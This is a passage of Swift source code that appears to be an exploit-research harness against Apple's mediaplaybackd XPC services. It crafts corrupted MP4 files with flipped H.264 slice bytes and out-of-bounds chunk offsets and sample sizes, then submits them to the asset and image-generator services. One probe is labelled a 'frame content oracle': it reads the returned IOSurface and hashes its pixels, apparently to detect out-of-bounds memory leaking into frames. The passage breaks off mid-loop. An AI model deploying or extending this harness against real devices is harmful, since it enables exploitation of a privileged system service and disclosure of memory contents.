        let pocType = sr.ue()
        var log2PocLsb = 0
        if pocType == 0 { log2PocLsb = sr.ue() }
        else if pocType == 1 { _ = sr.bit(); _ = sr.ue(); _ = sr.ue(); let n = sr.ue(); for _ in 0..<n { _ = sr.ue() } }
        _ = sr.ue(); _ = sr.bit()
        _ = sr.ue(); _ = sr.ue()
        let frameMbsOnly = sr.bit()

        // PPS
        var ppsStart = 0, ppsLen = 0
        if spsStart + spsLen + 3 < bytes.count {
            ppsLen = (Int(bytes[spsStart + spsLen + 1]) << 8) | Int(bytes[spsStart + spsLen + 2])
            ppsStart = spsStart + spsLen + 3
        }
        let pr = BR(rbsp(ppsStart, ppsLen))
        _ = pr.ue(); _ = pr.ue()
        let entropyCoding = pr.bit()
        let bottomFieldPoc = pr.bit()
        let numSliceGroups = pr.ue()
        var deblockingPresent = -1
        var redundantPicCnt = -1
        if numSliceGroups == 0 {
            _ = pr.ue(); _ = pr.ue()
            _ = pr.bit(); _ = pr.u(2)
            _ = pr.se(); _ = pr.se(); _ = pr.se()
            deblockingPresent = pr.bit()
            _ = pr.bit()
            redundantPicCnt = pr.bit()
        }
        emit("xib: pps entropy=\(entropyCoding) bottomFieldPoc=\(bottomFieldPoc) deblocking=\(deblockingPresent) redundant=\(redundantPicCnt)")

        // IDR NAL
        var idrRel = -1, idrLen = 0
        var q = 0
        while q + 4 <= size {
            let len = (Int(bytes[offset + q]) << 24) | (Int(bytes[offset + q + 1]) << 16)
                    | (Int(bytes[offset + q + 2]) << 8) | Int(bytes[offset + q + 3])
            if len <= 0 || q + 4 + len > size { break }
            if Int(bytes[offset + q + 4] & 0x1F) == 5 { idrRel = q; idrLen = len; break }
            q += 4 + len
        }
        guard idrRel >= 0 else { emit("xib: no IDR"); return }
        let idrStart = offset + idrRel
        let nalRefIdc = Int((bytes[idrStart + 4] >> 5) & 3)
        let sr2 = BR(rbsp(idrStart + 4, idrLen))
        _ = sr2.ue(); let sliceType = sr2.ue(); _ = sr2.ue()
        _ = sr2.u(log2FrameNum + 4)
        if frameMbsOnly == 0 { _ = sr2.bit() }
        let idrPicId = sr2.ue()
        if pocType == 0 {
            _ = sr2.u(log2PocLsb + 4)
            if bottomFieldPoc == 1 { _ = sr2.bit() }
        }
        if nalRefIdc != 0 {
            _ = sr2.bit(); _ = sr2.bit()      // dec_ref_pic_marking for IDR
        }
        if entropyCoding == 0 && sliceType != 2 && sliceType != 4 { _ = sr2.ue() }
        let qpDelta = sr2.se()
        var deblockIdc = -1, alpha = 0, beta = 0
        if deblockingPresent == 1 {
            deblockIdc = sr2.ue()
            if deblockIdc != 1 { alpha = sr2.se(); beta = sr2.se() }
        }
        let headerBits = sr2.p
        let headerBytes = (headerBits + 7) / 8
        emit("xib: slice type=\(sliceType) idr_pic_id=\(idrPicId) qp_delta=\(qpDelta) deblock=\(deblockIdc) alpha=\(alpha) beta=\(beta)")
        emit("xib: headerBits=\(headerBits) headerBytes=\(headerBytes) payloadBytes=\(idrLen - 1)")

        func build(_ kind: String) -> Data? {
            var d = bytes
            let body = idrStart + 5
            let headerEnd = body + headerBytes
            switch kind {
            case "baseline":
                break
            case "last_header_byte":
                d[headerEnd - 1] ^= 0xFF
            case "first_data_byte":
                guard headerEnd < idrStart + 4 + idrLen else { return nil }
                d[headerEnd] ^= 0xFF
            case "data_plus8":
                let o = headerEnd + 8
                guard o < idrStart + 4 + idrLen else { return nil }
                d[o] ^= 0xFF
            case "data_mid":
                let o = headerEnd + (idrStart + 4 + idrLen - headerEnd) / 2
                guard o < idrStart + 4 + idrLen else { return nil }
                d[o] ^= 0xFF
            case "data_tail":
                d[idrStart + 4 + idrLen - 1] ^= 0xFF
            default:
                return nil
            }
            return Data(d)
        }
        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }
        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        for kind in ["baseline", "last_header_byte", "first_data_byte", "data_plus8", "data_mid", "data_tail"] {
            guard let payload = build(kind) else { emit("xib: [\(kind)] build failed"); continue }
            gotFrame.pointee = false; gotFail.pointee = false
            guard let (ac, atok) = open("asset") else { emit("xib: [\(kind)] conn failed"); continue }
            var assetOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { emit("xib: [\(kind)] no asset"); xq_release(ac); continue }
            guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 24000) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) { xq_release(r) }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 1.6)
            emit("xib: [\(kind)] frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
            Thread.sleep(forTimeInterval: 0.2)
        }
        gotFrame.deallocate(); gotFail.deallocate()
        emit("xib: done")
    }

    func oobChunkProbe() {
        emit("xoc: chunk offset bounds")
        guard let mp4 = Bundle.main.url(forResource: "h264-main", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xoc: sample missing"); return
        }
        var bytes = [UInt8](original)
        func findTag(_ tag: String) -> Int? {
            let t = Array(tag.utf8)
            var i = 4
            while i + 4 <= bytes.count {
                if bytes[i] == t[0] && bytes[i+1] == t[1] && bytes[i+2] == t[2] && bytes[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func be32(_ p: Int) -> Int {
            guard p + 4 <= bytes.count else { return 0 }
            return (Int(bytes[p]) << 24) | (Int(bytes[p+1]) << 16) | (Int(bytes[p+2]) << 8) | Int(bytes[p+3])
        }
        func put32(_ p: Int, _ v: Int) {
            guard p + 4 <= bytes.count else { return }
            bytes[p] = UInt8((v >> 24) & 0xFF)
            bytes[p+1] = UInt8((v >> 16) & 0xFF)
            bytes[p+2] = UInt8((v >> 8) & 0xFF)
            bytes[p+3] = UInt8(v & 0xFF)
        }
        guard let stco = findTag("stco"), let stsz = findTag("stsz") else { emit("xoc: no tables"); return }
        let realOffset = be32(stco + 12)
        let realSize = be32(stsz + 8) != 0 ? be32(stsz + 8) : be32(stsz + 16)
        emit("xoc: file=\(bytes.count) chunkOffset=\(realOffset) sampleSize=\(realSize)")

        // stco entry sits at stco+12; stsz sample size at stsz+12 when uniform.
        func build(_ kind: String) -> Data? {
            var d = bytes
            switch kind {
            case "baseline":
                break
            case "chunk_oob_near":
                put32(stco + 12, bytes.count - 16)
            case "chunk_oob_far":
                put32(stco + 12, bytes.count + 4096)
            case "chunk_oob_huge":
                put32(stco + 12, 0xFFFFF000)
            case "chunk_zero":
                put32(stco + 12, 0)
            case "size_huge":
                put32(stsz + 12, 0x00FFFFFF)
            case "size_plus64k":
                put32(stsz + 12, realSize + 65536)
            case "size_zero":
                put32(stsz + 12, 0)
            default:
                return nil
            }
            return Data(d)
        }
        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }
        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        for kind in ["baseline", "chunk_oob_near", "chunk_oob_far", "chunk_oob_huge",
                     "chunk_zero", "size_huge", "size_plus64k", "size_zero"] {
            guard let payload = build(kind) else { emit("xoc: [\(kind)] build failed"); continue }
            gotFrame.pointee = false; gotFail.pointee = false
            guard let (ac, atok) = open("asset") else { emit("xoc: [\(kind)] conn failed"); continue }
            var assetOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    if e != 0 { emit("xoc: [\(kind)] crBB err=\(e)") }
                    xq_release(r)
                }
                xq_release(m)
            }
            if assetOID == 0 { xq_release(ac); continue }
            guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            var reqText = "skipped"
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 24000) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) {
                    reqText = String(".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) })
                    xq_release(r)
                } else {
                    reqText = "none"
                }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 1.8)
            emit("xoc: [\(kind)] req=\(reqText) frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
            Thread.sleep(forTimeInterval: 0.3)
        }
        gotFrame.deallocate(); gotFail.deallocate()
        emit("xoc: done")
    }

    func oobVerifyProbe() {
        emit("xov: chunk bounds, verified")
        guard let mp4 = Bundle.main.url(forResource: "h264-main", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xov: sample missing"); return
        }
        var bytes = [UInt8](original)
        func findTag(_ tag: String) -> Int? {
            let t = Array(tag.utf8)
            var i = 4
            while i + 4 <= bytes.count {
                if bytes[i] == t[0] && bytes[i+1] == t[1] && bytes[i+2] == t[2] && bytes[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func be32(_ p: Int) -> Int {
            guard p + 4 <= bytes.count else { return 0 }
            return (Int(bytes[p]) << 24) | (Int(bytes[p+1]) << 16) | (Int(bytes[p+2]) << 8) | Int(bytes[p+3])
        }
        func put32(_ p: Int, _ v: Int) {
            guard p + 4 <= bytes.count else { return }
            bytes[p] = UInt8((v >> 24) & 0xFF); bytes[p+1] = UInt8((v >> 16) & 0xFF)
            bytes[p+2] = UInt8((v >> 8) & 0xFF); bytes[p+3] = UInt8(v & 0xFF)
        }
        guard let stco = findTag("stco"), let stsz = findTag("stsz") else { emit("xov: no tables"); return }
        let realOffset = be32(stco + 12)
        let entryCount = be32(stco + 8)
        let sampleSize = be32(stsz + 8)
        let sampleCount = be32(stsz + 12)
        emit("xov: file=\(bytes.count) stcoEntries=\(entryCount) chunk0=\(realOffset) sampleSize=\(sampleSize) sampleCount=\(sampleCount)")

        func build(_ kind: String) -> Data? {
            var d = bytes
            switch kind {
            case "baseline":
                break
            case "near_end":      put32(stco + 12, bytes.count - 16)
            case "near_end_1k":   put32(stco + 12, bytes.count - 1024)
            case "mid_file":      put32(stco + 12, bytes.count / 2)
            case "beyond_end":    put32(stco + 12, bytes.count + 64)
            case "size_at_tail":  put32(stco + 12, bytes.count - 16); put32(stsz + 8, 4096)
            default:
                return nil
            }
            return Data(d)
        }
        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }

        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let active = UnsafeMutablePointer<XObj?>.allocate(capacity: 1)
        active.pointee = nil
        gotFrame.pointee = false; gotFail.pointee = false

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            // Bind the handler to this connection and ignore events from any other.
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                if let cur = active.pointee, cur != c { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        for kind in ["baseline", "near_end", "near_end_1k", "mid_file", "beyond_end", "size_at_tail"] {
            guard let payload = build(kind) else { emit("xov: [\(kind)] build failed"); continue }
            guard let (ac, atok) = open("asset") else { emit("xov: [\(kind)] conn failed"); continue }
            var assetOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { emit("xov: [\(kind)] no asset"); xq_release(ac); continue }
            guard let (gc, gtok) = open("assetimagegenerator") else { xq_cancel(ac); xq_release(ac); continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }

            // Drain any late notifications, then arm the connection and counters.
            Thread.sleep(forTimeInterval: 1.2)
            gotFrame.pointee = false; gotFail.pointee = false
            active.pointee = gc
            var reqText = "skipped"
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 24000) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) {
                    reqText = String(".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) })
                    xq_release(r)
                } else {
                    reqText = "none"
                }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 2.2)
            emit("xov: [\(kind)] req=\(reqText) frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")
            active.pointee = nil
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
        }
        gotFrame.deallocate(); gotFail.deallocate(); active.deallocate()
        emit("xov: done")
    }

    func frameHashProbe() {
        emit("xfh: frame content oracle")
        guard let mp4 = Bundle.main.url(forResource: "h264-main", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xfh: sample missing"); return
        }
        var bytes = [UInt8](original)
        func findTag(_ tag: String) -> Int? {
            let t = Array(tag.utf8)
            var i = 4
            while i + 4 <= bytes.count {
                if bytes[i] == t[0] && bytes[i+1] == t[1] && bytes[i+2] == t[2] && bytes[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func be32(_ p: Int) -> Int {
            guard p + 4 <= bytes.count else { return 0 }
            return (Int(bytes[p]) << 24) | (Int(bytes[p+1]) << 16) | (Int(bytes[p+2]) << 8) | Int(bytes[p+3])
        }
        func put32(_ p: Int, _ v: Int) {
            guard p + 4 <= bytes.count else { return }
            bytes[p] = UInt8((v >> 24) & 0xFF); bytes[p+1] = UInt8((v >> 16) & 0xFF)
            bytes[p+2] = UInt8((v >> 8) & 0xFF); bytes[p+3] = UInt8(v & 0xFF)
        }
        guard let stco = findTag("stco") else { emit("xfh: no stco"); return }

        func build(_ kind: String) -> Data? {
            var d = bytes
            switch kind {
            case "baseline": break
            case "near_end": put32(stco + 12, bytes.count - 16)
            case "near_end_1k": put32(stco + 12, bytes.count - 1024)
            default: return nil
            }
            return Data(d)
        }
        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }

        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let hashOut = UnsafeMutablePointer<UInt64>.allocate(capacity: 1)
        let dimsOut = UnsafeMutablePointer<String>.allocate(capacity: 1)
        let active = UnsafeMutablePointer<XObj?>.allocate(capacity: 1)
        active.pointee = nil
        gotFrame.pointee = false; gotFail.pointee = false
        hashOut.pointee = 0
        dimsOut.initialize(to: "none")

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                if let cur = active.pointee, cur != c { return }
                let d = self.describe(e)
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
                if d.contains("AIGDidGenerateCGImage") {
                    gotFrame.pointee = true
                    if let v = "IOSurface".withCString({ xq_dictionary_get_value(e, $0) }) {
                        emit("xfh: surf \(self.describe(v).prefix(60))")
                        let port = xq_mach_send_copy_right(v)
                        emit("xfh: port=\(port)")
                        if port != 0, let surf = IOSurfaceLookupFromMachPort(port) {
                            _ = xq_mach_port_deallocate(mach_task_self_, port)
                            IOSurfaceLock(surf, IOSurfaceLockOptions(rawValue: 1), nil)
                            let w = IOSurfaceGetWidth(surf)
                            let h = IOSurfaceGetHeight(surf)
                            let bpr = IOSurfaceGetBytesPerRow(surf)
                            let base = IOSurfaceGetBaseAddress(surf)
                            var hash: UInt64 = 0xcbf29ce484222325
                            var sampled = 0
                            if bpr > 0 && h > 0 {
                                let p = base.assumingMemoryBound(to: UInt8.self)
                                var y = 0
                                while y < h {
                                    var x = 0
                                    while x < bpr {
                                        hash ^= UInt64(p[y * bpr + x]); hash = hash &* 0x100000001b3
                                        sampled += 1
                                        x += 97
                                    }
                                    y += 7
                                }
                            }
                            IOSurfaceUnlock(surf, IOSurfaceLockOptions(rawValue: 1), nil)
                            hashOut.pointee = hash
                            dimsOut.pointee = "\(w)x\(h) bpr=\(bpr) n=\(sampled)"
                        }
                    }
                }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        var baseHash: UInt64 = 0
        for kind in ["baseline", "baseline2", "near_end", "near_end_1k"] {
            let real = kind == "baseline2" ? "baseline" : kind
            guard let payload = build(real) else { emit("xfh: [\(kind)] build failed"); continue }
            guard let (ac, atok) = open("asset") else { emit("xfh: [\(kind)] conn failed"); continue }
            var assetOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { emit("xfh: [\(kind)] no asset"); xq_release(ac); continue }
            guard let (gc, gtok) = open("assetimagegenerator") else { xq_cancel(ac); xq_release(ac); continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 1.2)
            gotFrame.pointee = false; gotFail.pointee = false
            hashOut.pointee = 0; dimsOut.pointee = "none"
            active.pointee = gc
            var reqText = "skipped"
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 24000) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) {
                    reqText = String(".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) })
                    xq_release(r)
                } else { reqText = "none" }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 2.2)
            if kind == "baseline" { baseHash = hashOut.pointee }
            let same = (baseHash != 0 && hashOut.pointee == baseHash) ? "SAME" : "DIFF"
